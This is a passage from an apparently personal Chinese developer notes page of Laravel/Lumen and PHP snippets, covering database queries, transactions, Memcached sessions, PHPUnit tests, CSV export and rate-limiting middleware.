-&gt;mergeBindings($sub_query-&gt;getQuery())<span class="comment">//mergeBindings() 合并绑定参数,getQuery()获得具体值</span></span><br><span class="line">                -&gt;groupBy(<span class="string">'name'</span>)</span><br><span class="line">                -&gt;orderBy(<span class="string">'id'</span>,<span class="string">'desc'</span>)</span><br><span class="line">                -&gt;paginate($limit);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;pageDate($results);</span><br></pre></td></tr></table></figure>
<h3 id="打包exe"><a href="#打包exe" class="headerlink" title="打包exe"></a>打包exe</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line">#https://segmentfault.com/a/1190000013795920</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    test <span class="string">"github.com/yimogit/gotest"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    test.HelloWord()</span><br><span class="line">&#125;</span><br><span class="line">go get -v github.com/yimogit/gotest</span><br><span class="line">go build -o test.exe</span><br></pre></td></tr></table></figure>
<h3 id="laravel读主"><a href="#laravel读主" class="headerlink" title="laravel读主"></a>laravel读主</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在Model里面加上下面这句，强制读主（写）库数据库，解决主从延迟问题。</span><br><span class="line">public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">boot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//清空从连接,会自动使用主连接</span></span><br><span class="line">    DB::connection()-&gt;setReadPdo(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="PHP使用Memcached存储Session"><a href="#PHP使用Memcached存储Session" class="headerlink" title="PHP使用Memcached存储Session"></a>PHP使用Memcached存储Session</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session.save_handler = memcached </span><br><span class="line">session.save_path = <span class="string">"localhost:11211"</span> </span><br><span class="line">session_start();</span><br><span class="line">var_dump(session_id());<span class="comment">//vkfc4eefu7ihlu5iv7v3je8rm0  https://php1024.com/posts/50.htm</span></span><br><span class="line">var_dump(ini_get(<span class="string">'memcached.sess_prefix'</span>));  <span class="comment">// 'memc.sess.key.'</span></span><br><span class="line">get memc.sess.key.vkfc4eefu7ihlu5iv7v3je8rm0</span><br></pre></td></tr></table></figure>
<h3 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">composer global <span class="built_in">require</span> <span class="string">"phpunit/phpunit=5.5.*"</span></span><br><span class="line">或者在composer.json文件中声明对phpunit/phpunit的依赖</span><br><span class="line">https:<span class="comment">//php1024.com/posts/15.htm</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"require-dev"</span>: &#123;</span><br><span class="line">        <span class="string">"phpunit/phpunit"</span>: <span class="string">"5.5.*"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">在tests\unit\MyApiTest.php中定义了两个测试用例</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyApiTest</span> <span class="keyword">extends</span> \<span class="title">PHPUnit_Framework_TestCase</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $client;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">setUp</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;client = <span class="keyword">new</span> \GuzzleHttp\Client( [</span><br><span class="line">            <span class="string">'base_uri'</span> =&gt; <span class="string">'http://myhost.com'</span>,</span><br><span class="line">            'http_errors' =&gt; false, #设置成 false 来禁用HTTP协议抛出的异常(如 4xx 和 5xx 响应)，默认情况下HTPP协议出错时会抛出异常。</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">testAction1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $response = $<span class="keyword">this</span>-&gt;client-&gt;get(<span class="string">'/api/v1/action1'</span>);</span><br><span class="line">        $body = $response-&gt;getBody();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加测试</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;assertEquals(<span class="number">200</span>, $response-&gt;getStatusCode());</span><br><span class="line">        $data = json_decode($body, <span class="literal">true</span>);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;assertArrayHasKey(<span class="string">'errorno'</span>, $data);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;assertArrayHasKey(<span class="string">'errormsg'</span>, $data);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;assertArrayHasKey(<span class="string">'data'</span>, $data);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;assertEquals(<span class="number">0</span>, $data[<span class="string">'errorno'</span>]);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;assertInternalType(<span class="string">'array'</span>, $data[<span class="string">'data'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">testAction2</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $response = $<span class="keyword">this</span>-&gt;client-&gt;post(<span class="string">'/api/v1/action2'</span>, [</span><br><span class="line">            <span class="string">'form_params'</span> =&gt; [</span><br><span class="line">                <span class="string">'name'</span> =&gt; <span class="string">'myname'</span>,</span><br><span class="line">                <span class="string">'age'</span> =&gt; <span class="number">20</span>,</span><br><span class="line">            ],</span><br><span class="line">        ]);</span><br><span class="line">        $body = $response-&gt;getBody();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加测试</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;assertEquals(<span class="number">200</span>, $response-&gt;getStatusCode());</span><br><span class="line">        $data = json_decode($body, <span class="literal">true</span>);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;assertArrayHasKey(<span class="string">'errorno'</span>, $data);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;assertArrayHasKey(<span class="string">'errormsg'</span>, $data);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;assertArrayHasKey(<span class="string">'data'</span>, $data);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;assertEquals(<span class="number">0</span>, $data[<span class="string">'errorno'</span>]);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;assertInternalType(<span class="string">'array'</span>, $data[<span class="string">'data'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">运行测试</span><br><span class="line">在项目根目录执行命令</span><br><span class="line"></span><br><span class="line">php vendor/bin/phpunit  tests/unit/MyApiTest.php</span><br></pre></td></tr></table></figure>
<h3 id="lumen-事务"><a href="#lumen-事务" class="headerlink" title="lumen 事务"></a>lumen 事务</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">use Illuminate\Database\Eloquent\ModelNotFoundException;</span><br><span class="line">use DB;</span><br><span class="line">use App\Models\Article;</span><br><span class="line">use App\Models\Comment;</span><br><span class="line">use App\Models\Counter;</span><br><span class="line">use App\Models\Log;</span><br><span class="line">...</span><br><span class="line"><span class="comment">// 开始事务</span></span><br><span class="line">DB::beginTransaction();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $id = <span class="number">5</span>;</span><br><span class="line">    $article = Article::findOrFail($id);</span><br><span class="line">    Comment::where(<span class="string">'article_id'</span>, $id)-&gt;<span class="keyword">delete</span>();</span><br><span class="line">    Counter::where(<span class="string">'article_id'</span>, $id)-&gt;<span class="keyword">delete</span>();</span><br><span class="line">    Log::insert([</span><br><span class="line">        <span class="string">'content'</span> =&gt; <span class="string">'删除文章：'</span>.$id</span><br><span class="line">    ]);</span><br><span class="line">    <span class="comment">// 流程操作顺利则commit</span></span><br><span class="line">    DB::commit();</span><br><span class="line">&#125; <span class="keyword">catch</span> (ModelNotFoundException $e) &#123;</span><br><span class="line">    <span class="comment">// 抛出异常则rollBack</span></span><br><span class="line">    DB::rollBack();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="lumen-sql"><a href="#lumen-sql" class="headerlink" title="lumen sql"></a>lumen sql</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">DB::statement(<span class="string">'drop table users'</span>);</span><br><span class="line">https:<span class="comment">//segmentfault.com/a/1190000005792605#articleHeader18</span></span><br><span class="line">DB::listen(<span class="function"><span class="keyword">function</span>(<span class="params">$sql, $bindings, $time</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// $query-&gt;sql</span></span><br><span class="line">    <span class="comment">// $query-&gt;bindings</span></span><br><span class="line">    <span class="comment">// $query-&gt;time</span></span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">$users = DB::connection(<span class="string">'foo'</span>)-&gt;select(...);</span><br><span class="line">$pdo = DB::connection()-&gt;getPdo();</span><br><span class="line"></span><br><span class="line">DB::beginTransaction();</span><br><span class="line">DB::rollback();</span><br><span class="line">DB::commit();</span><br><span class="line">DB::transaction(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DB::table(<span class="string">'users'</span>)-&gt;update([<span class="string">'votes'</span> =&gt; <span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    DB::table(<span class="string">'posts'</span>)-&gt;<span class="keyword">delete</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="xml2array"><a href="#xml2array" class="headerlink" title="xml2array"></a>xml2array</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://learnku.com/articles/22936#f411d0 一个类只做一件事 </span></span><br><span class="line">private <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">xml2Array</span>(<span class="params">$xml</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">static</span>::isXml($xml)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ResponseNotXMLException();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">_XML2Array</span>(<span class="params">SimpleXMLElement $parent</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $array = array();</span><br><span class="line"></span><br><span class="line">            foreach ($parent <span class="keyword">as</span> $name =&gt; $element) &#123;</span><br><span class="line">                ($node = &amp;$array[$name])</span><br><span class="line">                &amp;&amp; (<span class="number">1</span> === count($node) ? $node = array($node) : <span class="number">1</span>)</span><br><span class="line">                &amp;&amp; $node = &amp;$node[];</span><br><span class="line"></span><br><span class="line">                $node = $element-&gt;count() ? _XML2Array($element) : trim($element);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $array;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $xml = <span class="keyword">new</span> SimpleXMLElement($xml);</span><br><span class="line">        $data = _XML2Array($xml);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line">     private <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">isXml</span>(<span class="params">$xml</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> xml_parse(xml_parser_create(), $xml, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h3 id="导出Excel"><a href="#导出Excel" class="headerlink" title="导出Excel"></a>导出Excel</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//导出说明:因为EXCEL单表只能显示104W数据，同时使用PHPEXCEL容易因为数据量太大而导致占用内存过大，https://blog.csdn.net/Tim_phper/article/details/86636608</span></span><br><span class="line">    <span class="comment">//因此，数据的输出用csv文件的格式输出，但是csv文件用EXCEL软件读取同样会存在只能显示104W的情况，所以将数据分割保存在多个csv文件中，并且最后压缩成zip文件提供下载</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">putCsv</span>(<span class="params">array $head, $data, $mark = <span class="string">'attack_ip_info'</span>, $fileName = <span class="string">"test.csv"</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        set_time_limit(<span class="number">0</span>);</span><br><span class="line">        $sqlCount = $data-&gt;count();</span><br><span class="line">        <span class="comment">// 输出Excel文件头，可把user.csv换成你要的文件名</span></span><br><span class="line">        header(<span class="string">'Content-Type: application/vnd.ms-excel;charset=utf-8'</span>);</span><br><span class="line">        header(<span class="string">'Content-Disposition: attachment;filename="'</span> . $fileName . <span class="string">'"'</span>);</span><br><span class="line">        header(<span class="string">'Cache-Control: max-age=0'</span>);</span><br><span class="line"></span><br><span class="line">        $sqlLimit = <span class="number">100000</span>;<span class="comment">//每次只从数据库取100000条以防变量缓存太大</span></span><br><span class="line">        <span class="comment">// 每隔$limit行，刷新一下输出buffer，不要太大，也不要太小</span></span><br><span class="line">        $limit = <span class="number">100000</span>;</span><br><span class="line">        <span class="comment">// buffer计数器</span></span><br><span class="line">        $cnt = <span class="number">0</span>;</span><br><span class="line">        $fileNameArr = array();</span><br><span class="line">        <span class="comment">// 逐行取出数据，不浪费内存</span></span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; ceil($sqlCount / $sqlLimit); $i++) &#123;</span><br><span class="line">            $fp = fopen($mark . <span class="string">'_'</span> . $i . <span class="string">'.csv'</span>, <span class="string">'w'</span>); <span class="comment">//生成临时文件</span></span><br><span class="line">      <span class="comment">//     chmod('attack_ip_info_' . $i . '.csv',777);//修改可执行权限</span></span><br><span class="line">            $fileNameArr[] = $mark . <span class="string">'_'</span> .  $i . <span class="string">'.csv'</span>;</span><br><span class="line">        <span class="comment">// 将数据通过fputcsv写到文件句柄</span></span><br><span class="line">            fputcsv($fp, $head);</span><br><span class="line">            $dataArr = $data-&gt;offset($i * $sqlLimit)-&gt;limit($sqlLimit)-&gt;get()-&gt;toArray();</span><br><span class="line">            foreach ($dataArr <span class="keyword">as</span> $a) &#123;</span><br><span class="line">                $cnt++;</span><br><span class="line">                <span class="keyword">if</span> ($limit == $cnt) &#123;</span><br><span class="line">                    <span class="comment">//刷新一下输出buffer，防止由于数据过多造成问题</span></span><br><span class="line">                    ob_flush();</span><br><span class="line">                    flush();</span><br><span class="line">                    $cnt = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                fputcsv($fp, $a);</span><br><span class="line">            &#125;</span><br><span class="line">            fclose($fp);  <span class="comment">//每生成一个文件关闭</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//进行多个文件压缩</span></span><br><span class="line">        $zip = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">        $filename = $mark . <span class="string">".zip"</span>;</span><br><span class="line">        $zip-&gt;open($filename, <span class="attr">ZipArchive</span>::CREATE);   <span class="comment">//打开压缩包</span></span><br><span class="line">        foreach ($fileNameArr <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            $zip-&gt;addFile($file, basename($file));   <span class="comment">//向压缩包中添加文件</span></span><br><span class="line">        &#125;</span><br><span class="line">        $zip-&gt;close();  <span class="comment">//关闭压缩包</span></span><br><span class="line">        foreach ($fileNameArr <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            unlink($file); <span class="comment">//删除csv临时文件</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//输出压缩文件提供下载</span></span><br><span class="line">        header(<span class="string">"Cache-Control: max-age=0"</span>);</span><br><span class="line">        header(<span class="string">"Content-Description: File Transfer"</span>);</span><br><span class="line">        header(<span class="string">'Content-disposition: attachment; filename='</span> . basename($filename)); <span class="comment">// 文件名</span></span><br><span class="line">        header(<span class="string">"Content-Type: application/zip"</span>); <span class="comment">// zip格式的</span></span><br><span class="line">        header(<span class="string">"Content-Transfer-Encoding: binary"</span>); <span class="comment">//</span></span><br><span class="line">        header(<span class="string">'Content-Length: '</span> . filesize($filename)); <span class="comment">//</span></span><br><span class="line">        @readfile($filename);<span class="comment">//输出文件;</span></span><br><span class="line">        unlink($filename); <span class="comment">//删除压缩包临时文件</span></span><br><span class="line">    &#125;</span><br><span class="line">--当你有几百万数据的时候，执行</span><br><span class="line">  select <span class="keyword">from</span> table limit <span class="number">0</span>, <span class="number">10</span> 与 select <span class="keyword">from</span> table limit <span class="number">1000000</span>, <span class="number">10</span> 耗时会有明显的差别</span><br><span class="line">  你可以查下一offset带来的影响，简单说就是如果你limit <span class="number">1000000</span>, <span class="number">10</span> ，mysql处理的数据实际是<span class="number">1000010</span>条，然后再抛弃<span class="number">1000000</span>，获取后边的<span class="number">10</span>条，所以速度就慢了。</span><br><span class="line">  </span><br><span class="line">  还有一种场景就是当单表条数多时，有经验的开发列表页就不提供分页了，或者只让你查前几十页，不然真有人看几千页以后的数据，数据表受offset影响，返回速度会慢很多。</span><br><span class="line"> DB 果然要比 eloquent 方式快很多，正常了</span><br></pre></td></tr></table></figure>
<h3 id="Lumen-使用-throttle-限制接口访问频率"><a href="#Lumen-使用-throttle-限制接口访问频率" class="headerlink" title="Lumen 使用 throttle 限制接口访问频率"></a>Lumen 使用 throttle 限制接口访问频率</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//juejin.im/post/5c41bea8f265da61171cfecf</span></span><br><span class="line">在app\Http\Middleware中新建ThrottleRequests.php文件 内容为 https:<span class="comment">//github.com/illuminate/routing/blob/master/Middleware/ThrottleRequests.php</span></span><br><span class="line">protected <span class="function"><span class="keyword">function</span> <span class="title">resolveRequestSignature</span>(<span class="params">$request</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> sha1(</span><br><span class="line">        $request-&gt;method() .</span><br><span class="line">        <span class="string">'|'</span> . $request-&gt;server(<span class="string">'SERVER_NAME'</span>) .</span><br><span class="line">        <span class="string">'|'</span> . $request-&gt;path() .</span><br><span class="line">        <span class="string">'|'</span> . $request-&gt;ip()</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line">protected <span class="function"><span class="keyword">function</span> <span class="title">buildException</span>(<span class="params">$key, $maxAttempts</span>)</span>&#123;</span><br><span class="line">	$retryAfter = $<span class="keyword">this</span>-&gt;getTimeUntilNextRetry($key);</span><br><span class="line">	$headers = $<span class="keyword">this</span>-&gt;getHeaders(</span><br><span class="line">        $maxAttempts,</span><br><span class="line">        $<span class="keyword">this</span>-&gt;calculateRemainingAttempts($key, $maxAttempts, $retryAfter),</span><br><span class="line">        $retryAfter</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 修改了这一行</span></span><br><span class="line">  	<span class="keyword">return</span> <span class="keyword">new</span> ThrottleException(<span class="string">'Too Many Attempts.'</span>, <span class="number">429</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> 在app/Exceptions中新建ThrottleException.php</span><br><span class="line"> &lt;?php</span><br><span class="line"> </span><br><span class="line"> namespace App\Exceptions;</span><br><span class="line"> </span><br><span class="line"> use Exception;</span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">ThrottleException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span>&#123;</span><br><span class="line">     protected $isReport = <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">     public <span class="function"><span class="keyword">function</span> <span class="title">isReport</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;isReport;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">app/Exceptions/Handler.php捕获该抛出异常，在render方法增加以下判断</span><br><span class="line"><span class="keyword">if</span> ($exception <span class="keyword">instanceof</span> ThrottleException) &#123;</span><br><span class="line">	<span class="keyword">return</span> response([</span><br><span class="line">        <span class="string">'code'</span> =&gt; $exception-&gt;getCode(),</span><br><span class="line">        <span class="string">'msg'</span> =&gt; $exception-&gt;getMessage()</span><br><span class="line">	], <span class="number">429</span>);</span><br><span class="line">&#125;</span><br><span class="line">在bootstrap/app.php中注册：throttle:<span class="number">10</span>,<span class="number">2</span>表示的是<span class="number">2</span>分钟内访问<span class="number">10</span>次</span><br><span class="line">$app-&gt;routeMiddleware([</span><br><span class="line">     <span class="string">'throttle'</span> =&gt; App\Http\Middleware\ThrottleRequests::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"> $router-&gt;group([<span class="string">'middleware'</span> =&gt; [<span class="string">'throttle:10,2'</span>]],<span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">use</span> (<span class="params">$router</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">	$router-&gt;post(<span class="string">'feedback'</span>,<span class="string">'UserController@addFeedback'</span>);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="db有多个连接"><a href="#db有多个连接" class="headerlink" title="db有多个连接"></a>db有多个连接</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">门面模式下，laravel会用默认的连接(例如:defaultdb)而不是你认为的mydb。</span><br><span class="line">$orm = DB::table(<span class="string">'mydb.sale_area'</span>)</span><br><span class="line">        -&gt;leftJoin(<span class="string">'mydb.sale_group_relation'</span>, <span class="string">'mydb.sale_area.id'</span>, <span class="string">'='</span>, <span class="string">'mydb.sale_group_relation.child_id'</span>);</span><br><span class="line">QLSTATE[<span class="number">42000</span>]: Syntax error or access violation: <span class="number">1142</span> SELECT command denied</span><br><span class="line">to user <span class="string">'xxxxx'</span>@<span class="string">'xx.xx.xx.xx'</span> <span class="keyword">for</span> table <span class="string">'sale_area'</span></span><br><span class="line">$orm = DB::connection(<span class="string">"mydb::read"</span>)-&gt;table(<span class="string">"sale_area"</span>)</span><br><span class="line">        -&gt;leftJoin(<span class="string">'sale_group_relation'</span>, <span class="string">'sale_area.id'</span>, <span class="string">'='</span>, <span 